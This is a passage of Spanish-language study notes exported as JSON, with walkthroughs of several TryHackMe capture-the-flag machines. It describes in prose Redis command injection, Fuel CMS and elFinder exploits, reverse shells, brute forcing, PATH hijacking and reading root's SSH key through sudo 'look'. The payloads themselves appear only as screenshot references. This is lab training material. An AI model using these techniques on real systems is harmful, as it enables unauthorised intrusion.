    "breadcrumb": "THM > Maquinas > 1. Easy > 6. TakeOver",
    "content": "![[Pasted image 20251220224751.png]]\n\nHola,\n\nSoy el CEO y uno de los co-fundadores de `futurevera.thm`. En Futurevera, creemos que el futuro es el espacio. Hacemos mucha investigaci√≥n sobre el espacio y escribimos blogs sobre ello. Sol√≠amos ayudar a estudiantes con sus preguntas sobre el espacio, pero estamos reconstruyendo nuestro soporte.\n\nRecientemente, hackers blackhat se han acercado diciendo que podr√≠an tomar control del sitio y pidi√©ndonos un gran rescate. Por favor, ay√∫danos a encontrar lo que pueden tomar.\n\nNuestro sitio web est√° en `http://futurevera.thm`.\n\nNo te olvides de a√±adir la IP junto con el dominio a `/etc/hosts`.",
    "modified": "2025-12-21T00:57:17"
  },
  {
    "title": "0. Res",
    "path": "/apuntes/thm/maquinas/1-easy/4-res/0-res/",
    "src": "content/Ciberseguridad/THM/Maquinas/1. Easy/4. Res/0. Res.md",
    "breadcrumb": "THM > Maquinas > 1. Easy > 4. Res",
    "content": "[[Ciberseguridad/THM/Maquinas/1. Easy/4. Res/1. Introduction]]\n[[2. Resy Set Go]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/maquinas/1-easy/4-res/1-introduction/",
    "src": "content/Ciberseguridad/THM/Maquinas/1. Easy/4. Res/1. Introduction.md",
    "breadcrumb": "THM > Maquinas > 1. Easy > 4. Res",
    "content": "![[Pasted image 20251123202923.png]]\n\nHackea un servidor de base de datos vulnerable con una estructura en memoria en este reto semiguiado.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Resy Set Go",
    "path": "/apuntes/thm/maquinas/1-easy/4-res/2-resy-set-go/",
    "src": "content/Ciberseguridad/THM/Maquinas/1. Easy/4. Res/2. Resy Set Go.md",
    "breadcrumb": "THM > Maquinas > 1. Easy > 4. Res",
    "content": "1. ¬øCu√°ntos puertos abiertos tiene la m√°quina?\n   ![[Pasted image 20251123203402.png]]\n2. ¬øCu√°l es el sistema gestor de bases de datos instalado en el sistema?\n   Bas√°ndonos en el escaneo anterior, vamos a informarnos.\n   ![[Pasted image 20251123232520.png]]\n3. ¬øEn qu√© puerto corre el DBMS?\n   En el 6379.\n4. ¬øCu√°l es la versi√≥n del DBMS instalado en el servidor?\n   ![[Pasted image 20251123232944.png]]\n5. Compromete la m√°quina y localiza `user.txt`.\n\t1. Comprobamos la direcci√≥n IP en el puerto 80.\n\t   ![[Pasted image 20251123234610.png]]\n\t2. Despu√©s de investigar vi que hab√≠a una herramienta para conectarse a bases de datos redis.\n\t   ![[Pasted image 20251123235106.png]]\n\t3. Vamos a usar la primera opci√≥n para indicarle al host que nos conectaremos.\n\t   ![[Pasted image 20251123235259.png]]\n\t   Salen m√°s cosas pero si nos fijamos, ah√≠ hay un nombre de usuario (vianka): `/home/vianka/redis-stable/src/redis-server`.\n\t4. Investigando m√°s sobre redis y sus comandos podemos hacer varias cosas.\n\t   ![[Pasted image 20251123235923.png]]\n\t5. Ahora vamos a ver si ha funcionado.\n\t   ![[Pasted image 20251124000002.png]]\n\t   Vemos que podemos inyectar comandos as√≠ que vamos a mandarnos una reverse shell.\n\t6. Nos ponemos en escucha.\n\t   ![[Pasted image 20251124003530.png]]\n\t7. Le metemos el payload a nuestro archivo.\n\t   ![[Pasted image 20251124003554.png]]\n\t8. Cargamos el archivo y le metemos el payload en la variable `cmd`.\n\t   ![[Pasted image 20251124003705.png]]\n\t9. Esperamos conexi√≥n.\n\t   ![[Pasted image 20251124003727.png]]\n\t10. Escalamos la shell.\n\t    ![[Pasted image 20251124003755.png]]\n\t    Este m√©todo de cambiar/escalar la shell es muy √∫til para obtener una interactiva.\n\t11. Navegamos para encontrar la flag.\n\t    ![[Pasted image 20251124003918.png]]\n6. ¬øCu√°l es la contrase√±a del usuario local?\n\t1. Al intentar obtener la contrase√±a nos encontramos con un problema.\n\t   ![[Pasted image 20251124004049.png]]\n\t2. Por lo tanto seguimos en la pregunta siete y despu√©s volveremos aqu√≠.\n\t3. \n7. Escala privilegios y obt√©n `root.txt`.\n\t1. Buscamos archivos SUID.\n\t   ![[Pasted image 20251124004421.png]]\n\t2.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/maquinas/1-easy/1-vulnerability-capstone/1-introduction/",
    "src": "content/Ciberseguridad/THM/Maquinas/1. Easy/1. Vulnerability Capstone/1. Introduction.md",
    "breadcrumb": "THM > Maquinas > 1. Easy > 1. Vulnerability Capstone",
    "content": "![[Pasted image 20251122172059.png]]\n\nPara ver las habilidades aprendidas en el m√≥dulo [[6. Vulnerability Research]], vamos a realizar esta m√°quina.\n\nAckme Support ha incorporado recientemente un blog. Su equipo de desarrolladores ha pedido una auditor√≠a de seguridad antes de crear y publicar art√≠culos al p√∫blico.\n\nEs tu tarea realizar una auditor√≠a de seguridad en el blog buscando y explotando cualquier vulnerabilidad que encuentres.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Vulnerability Capstone",
    "path": "/apuntes/thm/maquinas/1-easy/1-vulnerability-capstone/0-vulnerability-capstone/",
    "src": "content/Ciberseguridad/THM/Maquinas/1. Easy/1. Vulnerability Capstone/0. Vulnerability Capstone.md",
    "breadcrumb": "THM > Maquinas > 1. Easy > 1. Vulnerability Capstone",
    "content": "[[Ciberseguridad/THM/Maquinas/1. Easy/1. Vulnerability Capstone/1. Introduction]]\n[[2. Exploit the Machine]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Exploit the Machine",
    "path": "/apuntes/thm/maquinas/1-easy/1-vulnerability-capstone/2-exploit-the-machine/",
    "src": "content/Ciberseguridad/THM/Maquinas/1. Easy/1. Vulnerability Capstone/2. Exploit the Machine.md",
    "breadcrumb": "THM > Maquinas > 1. Easy > 1. Vulnerability Capstone",
    "content": "1. Vamos a la p√°gina dada.\n   ![[Pasted image 20251122173014.png]]\n   De entrada ya podemos ver tanto el nombre del servicio que corre (Fuel CMS) como la versi√≥n (1.4).\n2. Buscamos estos t√©rminos en Exploit-DB.\n   ![[Pasted image 20251122173312.png]]\n3. Nos metamos en el RCE exploit que nos metamos, el CVE es el mismo.\n   ![[Pasted image 20251122173409.png]]\n4. Probando los tres no funciona ninguno, por lo que vamos a buscar en github.\n   ![[Pasted image 20251122174846.png]]\n5. Seguimos los pasos especificados.\n   ![[Pasted image 20251122174959.png]]\n6. Probamos el comando.\n   ![[Pasted image 20251122175253.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/maquinas/1-easy/2-pickle-rick/1-introduction/",
    "src": "content/Ciberseguridad/THM/Maquinas/1. Easy/2. Pickle Rick/1. Introduction.md",
    "breadcrumb": "THM > Maquinas > 1. Easy > 2. Pickle Rick",
    "content": "![[Pasted image 20251218165357.png]]\n\nEste reto ambientado en Rick y Morty requiere que explotes un servidor web y encuentres tres ingredientes para ayudar a Rick a hacer su poci√≥n y transformarse de nuevo en humano (ahora es un pepinillo, **El Rickynillo**).",
    "modified": "2025-12-19T00:53:33"
  },
  {
    "title": "0. Pickle Rick",
    "path": "/apuntes/thm/maquinas/1-easy/2-pickle-rick/0-pickle-rick/",
    "src": "content/Ciberseguridad/THM/Maquinas/1. Easy/2. Pickle Rick/0. Pickle Rick.md",
    "breadcrumb": "THM > Maquinas > 1. Easy > 2. Pickle Rick",
    "content": "[[Ciberseguridad/THM/Maquinas/1. Easy/2. Pickle Rick/1. Introduction]]\n[[2. Finding the Ingredients]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Finding the Ingredients",
    "path": "/apuntes/thm/maquinas/1-easy/2-pickle-rick/2-finding-the-ingredients/",
    "src": "content/Ciberseguridad/THM/Maquinas/1. Easy/2. Pickle Rick/2. Finding the Ingredients.md",
    "breadcrumb": "THM > Maquinas > 1. Easy > 2. Pickle Rick",
    "content": "1. Empezamos escaneando la m√°quina.\n   ![[Pasted image 20251218181133.png]]\n2. Vamos a ir a la p√°gina web (puerto 80).\n   ![[Pasted image 20251218181652.png]]\n   B√°sicamente Rick nos pide ayuda porque necesita sus ingredientes que est√°n en el ordenador pero no recuerda su contrase√±a y sin ella no nos podemos loguear. Sabemos que √©l es Rick, por lo que el usuario puede ser algo tipo `admin`, `root` o `rick`, siendo la √∫ltima la m√°s probable.\n3. Pero bueno, de momento vamos a seguir con el reconocimiento. Vamos a enumerar directorios con `gobuster`.\n   ![[Pasted image 20251218183448.png]]\n4. Mientras tanto vamos a inspeccionar la p√°gina con `Ctrl+U`.\n   ![[Pasted image 20251218182231.png]]\n   Vaya vaya, acabamos de encontrar el usuario: `R1ckRul3s`.\n5. Vamos a meternos en `/assets`.\n   ![[Pasted image 20251218183038.png]]\n6. Parece que hay unos cuantos archivos, vamos a descargarlos para examinarlos.\n   ![[Pasted image 20251218183334.png]]\n   O bien hay un formulario de subida o bien hay mensajes ocultos aqu√≠, seguro.\n7. Despu√©s de usar `file` y `exiftool` parece ser que no hay nada.\n   ![[Pasted image 20251218183958.png]]\n8. Vamos a lanzar un ataque de fuerza bruta contra el puerto 22 de la m√°quina, es nuestra √∫ltima bala.\n   ![[Pasted image 20251218184534.png]]\n   No funciona.\n9. Intentar loguearse sin m√°s tampoco.\n   ![[Pasted image 20251218184604.png]]\n10. Vamos a hacer un escaneo m√°s a fondo.\n    ![[Pasted image 20251218184642.png]]\n    Parece que SSH es una versi√≥n antigua.\n11. No he encontrado nada despu√©s de buscar vulnerabilidades de las versiones de SSH y Apache. As√≠ que he optado por realizar m√°s enumeraci√≥n.\n    ![[Pasted image 20251218191615.png]]\n12. Vamos  a la p√°gina de `login.php`.\n    ![[Pasted image 20251218190310.png]]\n13. Vamos a interceptar la petici√≥n con Burp Suite para ver c√≥mo es.\n    ![[Pasted image 20251218190431.png]]\n    Es una petici√≥n por POST.\n14. Vamos a lanzar un ataque de fuerza bruta contra la p√°gina de login.\n\t1. Primero probamos c√≥mo se ve la respuesta cuando la metemos mal.\n\t   ![[Pasted image 20251218191255.png]]\n\t2. Con esta informaci√≥n ya podemos iniciar el ataque de fuerza bruta.\n\t   ![[Pasted image 20251218192000.png]]\n15. Mientras espero me da por seguir mirando y enumerando en la p√°gina. Pruebo `/robots.txt`.\n    ![[Pasted image 20251218191835.png]]\n    Parece que podr√≠a ser la contrase√±a. Esto es algo que Rick dice muuuuucho.\n16. Efectivamente era la contrase√±a.\n    ![[Pasted image 20251218191925.png]]\n    Ya no tiene sentido seguir con el ataque de fuerza bruta as√≠ que lo paro.\n17. Parece que podemos ejecutar comandos. Vamos a listar y a leer si hay algo interesante.\n    ![[Pasted image 20251218194113.png]]\n18. No se puede hacer `cat` directo.\n    ![[Pasted image 20251218194152.png]]\n19. Si nos ponemos a investigar, en todas las otras p√°ginas se ve el `/denied.php`.\n    ![[Pasted image 20251218194818.png]]\n20. Si lo intentamos borrar no podemos porque es propiedad de `Ubuntu`. Pero si escribimos `sudo -l`:\n    ![[Pasted image 20251218194951.png]]\n21. Si hacemos `sudo rm denied.php`.\n    ![[Pasted image 20251218195105.png]]\n22. Tampoco funciona as√≠.\n    ![[Pasted image 20251218195307.png]]\n23. Vamos a probar con una reverse shell.\n    ![[Pasted image 20251218195437.png]]\n    ![[Pasted image 20251218195606.png]]\n24. Recibimos la shell.\n    ![[Pasted image 20251218195626.png]]\n25. Estabilizamos y mejoramos la shell.\n    ![[Pasted image 20251218195832.png]]\n26. Leemos el primer ingrediente.\n    ![[Pasted image 20251218195912.png]]\n    En `clue.txt` pone que miremos por el sistema de archivos para encontrar la segunda pista.\n27. Buscando llegamos al perfil de `rick`.\n    ![[Pasted image 20251218200239.png]]\n28. Y all√≠ leemos el segundo ingrediente.\n    ![[Pasted image 20251218200305.png]]\n29. Si buscamos por history.\n    ![[Pasted image 20251218200637.png]]\n30. Si lo leemos.\n    ![[Pasted image 20251218200712.png]]\n\n>[!SUCCESS] Hemos encontrado todos los ingredientes :))",
    "modified": "2025-12-19T00:53:33"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/maquinas/1-easy/3-lookup/1-introduction/",
    "src": "content/Ciberseguridad/THM/Maquinas/1. Easy/3. Lookup/1. Introduction.md",
    "breadcrumb": "THM > Maquinas > 1. Easy > 3. Lookup",
    "content": "![[Pasted image 20251123191552.png]]\n\nLookup ofrece un tesoro de oportunidades de aprendizaje para aspirantes a hackers. Esta fascinante m√°quina muestra diversas vulnerabilidades reales, desde debilidades en aplicaciones web hasta t√©cnicas de escalada de privilegios. Al explorar y explotar estas vulnerabilidades, los hackers pueden perfeccionar sus habilidades y adquirir una valiosa experiencia en hacking √©tico. Gracias a \"Lookup\", los hackers pueden dominar el arte del reconocimiento, el escaneo y la enumeraci√≥n para descubrir servicios y subdominios ocultos. Aprender√°n a explotar vulnerabilidades en aplicaciones web, como la inyecci√≥n de comandos, y comprender√°n la importancia de las pr√°cticas de codificaci√≥n segura. La m√°quina tambi√©n desaf√≠a a los hackers a automatizar tareas, demostrando el poder del scripting en las pruebas de penetraci√≥n.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Lookup",
    "path": "/apuntes/thm/maquinas/1-easy/3-lookup/0-lookup/",
    "src": "content/Ciberseguridad/THM/Maquinas/1. Easy/3. Lookup/0. Lookup.md",
    "breadcrumb": "THM > Maquinas > 1. Easy > 3. Lookup",
    "content": "[[Ciberseguridad/THM/Maquinas/1. Easy/3. Lookup/1. Introduction]]\n[[Ciberseguridad/THM/Maquinas/1. Easy/3. Lookup/2. Finding the flags]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Finding the flags",
    "path": "/apuntes/thm/maquinas/1-easy/3-lookup/2-finding-the-flags/",
    "src": "content/Ciberseguridad/THM/Maquinas/1. Easy/3. Lookup/2. Finding the flags.md",
    "breadcrumb": "THM > Maquinas > 1. Easy > 3. Lookup",
    "content": "1. Analizamos la direcci√≥n que nos dan.\n   ![[Pasted image 20251219193414.png]]\n2. Hacemos un poco m√°s de enumeraci√≥n.\n   ![[Pasted image 20251219193541.png]]\n3. Y un poco m√°s de reconocimiento.\n   ![[Pasted image 20251219194552.png]]\n   ![[Pasted image 20251219194626.png]]\n4. Vamos a ver la p√°gina web, `/login.php` est√° vac√≠a y `/index.php` es la misma que sin poner nada.\n   ![[Pasted image 20251123192534.png]]\n5. Vamos a abrir Burp Suite y a ver como se ve una petici√≥n fallida.\n   ![[Pasted image 20251219195722.png]]\n6. Probamos a hacer fuerza bruta.\n   ![[Pasted image 20251219202217.png]]\n   Nada.\n7. Vamos a enumerar m√°s.\n   ![[Pasted image 20251219202454.png]]\n   Seguimos sin nada.\n8. Si probamos con el usuario `admin`, vemos que la respuesta es diferente.\n   ![[Pasted image 20251219203726.png]]\n9. Vamos a lanzar el ataque para el usuario `admin` filtrando aquellas respuestas en las que aparezca `Wrong password`.\n   ![[Pasted image 20251219205153.png]]\n10. Si intentamos loguearnos con estas credenciales nos dice que `Wrong username or password`.\n    ![[Pasted image 20251219205831.png]]\n11. Volvemos a Burp Suite. Vamos a recapitular lo que tenemos.\n\t1. Si metemos un usuario y una contrase√±a equivocada: `Wrong username or password`.\n\t2. Si metemos un usuario existente y una contrase√±a equivocada: `Wrong password.`\n\t3. Si metemos un usuario existente y una contrase√±a que en principio pens√°bamos acertada, nos sale: `Wrong username or password`.\n\t   Bas√°ndonos en esto podemos deducir que la contrase√±a es correcta, pero no para el usuario `admin`.\n12. Vamos a hacer fuerza bruta contra el usuario.\n    ![[Pasted image 20251219212157.png]]\n    Grande jose.\n13. Nos logueamos con `jose:password123`. Esto nos lleva a `files.lookup.thm` lo tenemos que meter en `/etc/hosts`.\n    ![[Pasted image 20251219213449.png]]\n    Parece que hay un bot√≥n de subida de archivos as√≠ que vamos a intentar subir una reverse shell.\n14. Intentamos subir la shell.\n    ![[Pasted image 20251219214012.png]]\n    Salta error, vamos a cambiar la extensi√≥n a `.txt`.\n15. Subimos `reverseshell.txt`.\n    ![[Pasted image 20251219214252.png]]\n    Tampoco va.\n16. Vamos a probar con Burp Suite a ver qu√© vemos.\n    ![[Pasted image 20251219214717.png]]\n    Intentando subir un archivo JS me lo deniega tambi√©n.\n17. Vamos a realizar m√°s investigaci√≥n en la p√°gina (s√≠, m√°s enumeraci√≥n).\n    ![[Pasted image 20251219235133.png]]\n    Encontramos un bot√≥n que nos deja ver el software de gesti√≥n junto a la versi√≥n: `elFinder 2.1.47`.\n18. Buscamos en una base de datos de exploits.\n    ![[Pasted image 20251219235406.png]]\n19. El m√©todo encontrado no soporta autentificaci√≥n por lo que vamos a ver si podemos acceder al endpoint de subida sin autentificarnos.\n    ![[Pasted image 20251219235606.png]]\n    Efectivamente s√≠ se puede.\n20. El c√≥digo de Exploit-DB no ha funcionado por lo que buscamos en GitHub.\n    ![[Pasted image 20251220000317.png]]\n21. Nos ponemos en escucha.\n    ![[Pasted image 20251220000435.png]]\n22. Lo ejecutamos como dice.\n    ![[Pasted image 20251220000512.png]]\n23. Obtenemos la shell.\n    ![[Pasted image 20251220000534.png]]\n24. Despu√©s de estabilizar la shell y buscar un poco nos encontramos con el archivo que contiene la flag de user.\n    ![[Pasted image 20251220001350.png]]\n    Pero no podemos leerla con nuestros permisos actuales, ni el archivo `.passwords` tampoco.\n25. Despu√©s de hacer `sudo -l` y ver que no podemos hacer nada, probamos a buscar archivos SUID.\n    ![[Pasted image 20251220001521.png]]\n26. Tanto `pkexec` como `pwm` llaman mi atenci√≥n. Comprobaremos la versi√≥n de pkexec.\n    ![[Pasted image 20251220003250.png]]\n    Es la 0.105, buscaremos un exploit.\n27. Hemos encontrado un exploit.\n    ![[Pasted image 20251220003335.png]]\n28. Seguimos las instrucciones y no funciona de ninguna manera.\n    ![[Pasted image 20251220003957.png]]\n29. Vamos a investigar el otro SUID sospechoso: `/usr/sbin/pwm`.\n    ![[Pasted image 20251220004107.png]]\n    Parece que ejecuta `id` y luego lo usa para meterlo en una ruta. Si consigui√©ramos que extrajese `think` podr√≠amos leer el archivo `.passwords`.\n30. Comprobamos el `$PATH`.\n    ![[Pasted image 20251220004717.png]]\n    Parece que podemos modificarlo. Ahora s√≥lo tenemos que hacer un script y guardarlo en `/tmp/id` y se ejecutar√° en lugar de el verdadero `id`.\n31. Creamos el script y le damos permisos de ejecuci√≥n con `chmod +x /tmp/id`.\n    ![[Pasted image 20251220005102.png]]\n32. Volvemos a ejecutar `/user/sbin/pwm`.\n    ![[Pasted image 20251220005303.png]]\n    Obtenemos lo que parece una lista de contrase√±as.\n33. Vamos a probar fuerza bruta con dicha lista contra el usuario `think` por ssh.\n    ![[Pasted image 20251220005624.png]]\n34. Iniciamos sesi√≥n con el usuario `think` y leemos la flag.\n    ![[Pasted image 20251220005827.png]]\n35. Buscando maneras de escalar privilegios nos encontramos con `/usr/bin/look`.\n    ![[Pasted image 20251220005959.png]]\n36. Si miramos en GTFOBins:\n    ![[Pasted image 20251220010030.png]]\n    BINGO!\n37. Seguimos los pasos.\n    ![[Pasted image 20251220010149.png]]\n    En este caso se trata de un SHA512, lo sabemos gracias al comienzo: `$6$`. Adem√°s vemos que el formato es `salt.pass`.\n38. Miramos en el manual de `hashcat`:\n    ![[Pasted image 20251220011106.png]]\n39. Vamos a usar `hashcat` con `rockyou.txt` para obtener la contrase√±a.\n    ![[Pasted image 20251220011225.png]]\n    ![[Pasted image 20251220021852.png]]\n    No hemos encontrado la contrase√±a as√≠. Es por eso que pensaremos en otra manera.\n40. Si podemos leer cualquier archivo como sudo, en realidad tambi√©n podemos leer la clave ssh de root y usarla desde nuestra propia m√°quina para conectarnos como root. Empezamos ley√©ndola.\n    ![[Pasted image 20251220012038.png]]\n41. La copiamos en nuestra m√°quina y la usamos para iniciar sesi√≥n.\n    ![[Pasted image 20251220012535.png]]\n    MUY IMPORTANTE CAMBIAR LOS PERMISOS A `600` (`rw-------`).\n42. Leemos la flag.\n    ![[Pasted image 20251220012759.png]]\n\n>[!SUCCESS] Hemos pwneado la m√°quina y obtenido ambas flags. Phew! Vaya m√°quina mas \"easy\", ¬øverdad? ;)",
    "modified": "2025-12-20T01:49:23"
  }
]